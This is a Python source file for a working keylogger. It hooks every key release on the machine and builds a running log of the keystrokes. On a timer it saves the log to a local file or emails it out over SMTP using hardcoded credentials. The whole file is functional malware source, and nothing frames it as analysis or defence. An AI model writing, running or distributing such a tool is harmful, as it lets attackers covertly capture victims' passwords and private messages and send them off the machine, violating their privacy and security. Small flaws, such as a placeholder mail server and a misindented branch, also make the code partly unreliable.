import keyboard
import smtplib
from threading import Timer
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

SEND_REPORT_EVERY = 60 #Testing 60sec ending with 24HR (86400 sec)
EMAIL_ADDRESS = "email@provider.tld"
EMAIL_PASSWORD = "password_here"


class Keylogger:
    def __init__(self, interval, report_method="email"):
        #pass SEND_REPORT_EVERY -> INTERVAL
        self.interval = interval
        self.report_method = report_method
        #this is the string variable that contains the log file
        #the keystrokes within self.interval
        self.log = ""
        # record start & end datetimes
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()


    def callback(self, event):
        """
        This callback will be invoked whenever a keyboard event occurs
        (ie. when a key is released) this utilizes keyboards on_release() function
        """
        name = event.name
        if len(name) > 1:
            # not a char, special key e.g. ctrl, alt, etc...
            # uppercase with []
            if name == "space":
                #" " instead of "space"
                name = " "
                # adds new line when ENTER is pressed
            elif name == "enter":
                 name = "[ENTER]\n"
                # converts decimal to "."
            elif name == "decimal":
                 name = "."
            else:
                #replace spces(" ") with underscores("_")
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
                #Lastly, add key name to the global 'self.log' var
        self.log += name


    def update_filename(self):
        #constructs the file name for identification using start and end dt's
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"


    def report_to_file(self):
        with open(f"{self.filename}.txt", "w") as f:
            print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")


    def prepare_mail(self, message):
        """
        Utility function to construct a MIMEMultipart from a text it
        creates an html version as well as a txt version to be sent via email
        """
        msg = MIMEMultipart("alternative")
        msg["From"] = EMAIL_ADDRESS
        msg["To"] = EMAIL_ADDRESS
        msg["Subject"] = "Keylogger logs"
        html = f"<p>{message}</p>"
        text_part = MIMEText(message, "plain")
        html_part = MIMEText(html, "html")
        msg.attach(text_part)
        msg.attach(html_part)

        return msg.as_string()


    def sendmail(self, email, password, message, verbose=1):
        server = smtplib.SMTP(host="smtp.server.com", port=123)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, self.prepare_mail(message))
        server.quit()
        if verbose:
            print(f"{datetime.now()} - Send an email to {email} containing:  {message}")


    def report(self):
        if self.log:
            self.end_dt = datetime.now()
            self.update_filename()
            if self.report_method == "email":
                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            elif self.report_method == "file":
                self.report_to_file()
            
                print(f"[{self.filename}] - {self.log}")
                self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()


    def start(self):
        self.start_dt = datetime.now()
        
        keyboard.on_release(callback=self.callback)
        
        self.report()

        print(f"{datetime.now()} - started keylogger")

        keyboard.wait()



if __name__ == "__main__":
    # if you want a keylogger to send to your email
    # keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
    # if you want a keylogger to record keylogs to a local file 
    # (and then send it using your favorite method)
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
    keylogger.start()